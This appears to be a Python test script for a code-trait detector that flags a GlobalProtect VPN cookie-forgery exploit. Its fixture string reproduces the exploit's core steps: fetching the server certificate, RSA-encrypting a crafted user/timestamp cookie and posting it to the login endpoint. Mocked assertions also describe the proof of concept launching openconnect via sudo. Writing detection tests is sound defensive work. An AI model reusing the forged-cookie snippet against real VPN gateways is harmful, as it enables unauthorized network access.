#!/usr/bin/env python3
"""Exercise trait boundaries; optionally inspect the actual PoC using mocks only."""
import argparse
import ast
import base64
import io
import json
import os
from pathlib import Path
import subprocess
import tempfile
from types import SimpleNamespace

ATTEMPT = 'objectives/execution/exploit/network-service/service-api-abuse::globalprotect-cookie-bypass-attempt'
ENCRYPT = 'micro-behaviors/crypto/encrypt::python-encrypt-method-call'
FETCH = 'micro-behaviors/crypto/certificate/usage::python-tls-server-certificate-fetch'
PARSE = 'micro-behaviors/crypto/certificate/usage::python-pem-x509-certificate-load'
PADDING = 'micro-behaviors/crypto/asymmetric/rsa::python-pkcs1v15-padding-call'
SHELL = 'micro-behaviors/process/create/shell/interpreter::python-bash-argv-launch'
OLD = {
    'objectives/credential-access/validation/session::globalprotect-auth-override-cookie-forgery',
    'objectives/execution/exploit/network-service/service-api-abuse::globalprotect-forged-cookie-openconnect-tunnel',
    'micro-behaviors/crypto/symmetric/encrypt::python-encrypt-method-call',
    'micro-behaviors/process/create/subprocess::python-bash-argv-launch',
}
SOURCE = '''import ssl, base64, requests
from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import padding
pem = ssl.get_server_certificate((host, 443))
cert = x509.load_pem_x509_certificate(pem.encode())
pub_key = cert.public_key()
clear = f"{user};;Windows;;{timestamp};0.0.0.0".encode()
cipher = pub_key.encrypt(clear, padding.PKCS1v15())
cookie = base64.b64encode(cipher)
requests.post("https://{host}/ssl-vpn/login.esp", data={"portal-userauthcookie": cookie})
'''


def check_runtime(sample):
    # Execute only the specimen's function definitions. Imports, main(), shell,
    # network, filesystem, and privilege operations never receive live APIs.
    tree = ast.parse(Path(sample).read_text())
    tree.body = [node for node in tree.body if isinstance(node, ast.FunctionDef)]
    events = []
    def encrypt(clear, pad):
        events.append(('encrypt', clear, pad))
        return b'encrypted-cookie'
    public = SimpleNamespace(encrypt=encrypt)
    def cert_fetch(address):
        events.append(('tls', address))
        return 'PEM'
    def post(url, **kwargs):
        events.append(('post', url, kwargs))
        return SimpleNamespace(status_code=200, text='<jnlp>')
    files = []
    class FakeFile(io.StringIO):
        def __init__(self):
            super().__init__()
            self.name = f'/mock/{len(files)}'
            files.append(self)
        def close(self):
            # Preserve buffers for inspection without writing to disk.
            pass
    def temporary(**kwargs):
        events.append(('temporary', kwargs))
        return FakeFile()
    ns = {
        'ssl': SimpleNamespace(get_server_certificate=cert_fetch),
        'x509': SimpleNamespace(load_pem_x509_certificate=lambda pem: SimpleNamespace(public_key=lambda: public)),
        'padding': SimpleNamespace(PKCS1v15=lambda: 'PKCS1v15'),
        'base64': base64,
        'time': SimpleNamespace(time=lambda: 123),
        'requests': SimpleNamespace(post=post),
        'tempfile': SimpleNamespace(NamedTemporaryFile=temporary),
        'os': SimpleNamespace(chmod=lambda *args: events.append(('chmod', args))),
        'subprocess': SimpleNamespace(run=lambda *args, **kwargs: events.append(('run', args, kwargs))),
    }
    exec(compile(tree, '<function-definitions-only>', 'exec'), ns)
    cookie = ns['check_globalprotect_bypass']('vpn.example', username='analyst')
    assert events[0] == ('tls', ('vpn.example', 443))
    assert events[1] == ('encrypt', b'analyst;;Windows;;123;0.0.0.0', 'PKCS1v15')
    assert base64.b64decode(cookie) == b'encrypted-cookie'
    assert events[2][1] == 'https://vpn.example:443/ssl-vpn/login.esp'
    assert events[2][2]['data'] == {'user': 'analyst', 'passwd': '', 'portal-userauthcookie': cookie}
    assert events[2][2]['verify'] is False
    ns['connect_openconnect']('https://vpn.example', 'analyst', cookie, 'operator-password')
    assert files[0].getvalue() == cookie
    script = files[1].getvalue()
    assert "echo 'operator-password'" in script
    assert 'sudo -S openconnect --protocol=gp' in script
    assert '--usergroup=portal:portal-userauthcookie' in script
    assert 'rm -f /mock/0' in script
    assert events[-2] == ('chmod', ('/mock/1', 0o700))
    assert events[-1] == ('run', (['/bin/bash', '/mock/1'],), {'check': False})
    # Unsuccessful login must not return a reusable cookie.
    ns['requests'].post = lambda *args, **kwargs: SimpleNamespace(status_code=403, text='denied')
    assert ns['check_globalprotect_bypass']('vpn.example') is None
    # --vuln's helper only displays the provided entries; it does not connect.
    ns['open'] = lambda _: io.StringIO('vpn.example\n')
    ns['print'] = lambda *args: None
    assert ns['select_vulnerable_target']('ignored') == ['vpn.example']
    print('PASS actual PoC function paths with network, shell, sudo and files mocked')


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--sample')
    args = parser.parse_args()
    if args.sample:
        check_runtime(args.sample)
    cases = {
        'complete.py': (SOURCE, {ATTEMPT, ENCRYPT, FETCH, PARSE, PADDING}),
        'no-post.py': (SOURCE.replace('requests.post(', 'print('), {ENCRYPT, FETCH, PARSE, PADDING}),
        'no-encryption.py': (SOURCE.replace('pub_key.encrypt(clear, padding.PKCS1v15())', 'clear'), {FETCH, PARSE}),
        'normal-cookie.py': (SOURCE.replace(';;Windows;;{timestamp};0.0.0.0', ';ordinary-session'), {ENCRYPT, FETCH, PARSE, PADDING}),
        'names-only.py': ('text = ' + repr(SOURCE) + '\n', set()),
        'shell-argv.py': ('import subprocess\nsubprocess.run(["/bin/bash", script])\n', {SHELL}),
        'encrypt-comment.py': ('# public.encrypt(data)\ntext = "public.encrypt(data)"\n', set()),
    }
    with tempfile.TemporaryDirectory(prefix='vpn-review-') as temp:
        folder = Path(temp)
        for name, (source, _) in cases.items():
            (folder / name).write_text(source)
        result = subprocess.run([os.environ.get('CLEAVE', 'cleave'), '--traits-dir', '.', '--format', 'jsonl', str(folder)],
                                text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        assert result.returncode == 0, result.stderr
        reports = [json.loads(line) for line in result.stdout.splitlines() if line.strip()]
        seen = set()
        tracked = {ATTEMPT, ENCRYPT, FETCH, PARSE, PADDING, SHELL}
        for file in (file for report in reports for file in report['files']):
            name = Path(file['path']).name
            if name not in cases:
                continue
            ids = {trait['id'] for trait in file.get('traits', [])}
            assert ids & tracked == cases[name][1], (name, ids & tracked, cases[name][1])
            assert not ids & OLD, (name, ids & OLD)
            assert all(t['crit'] != 5 for t in file.get('traits', [])), name
            seen.add(name)
            print('PASS', name)
        assert seen == set(cases), seen


if __name__ == '__main__':
    main()
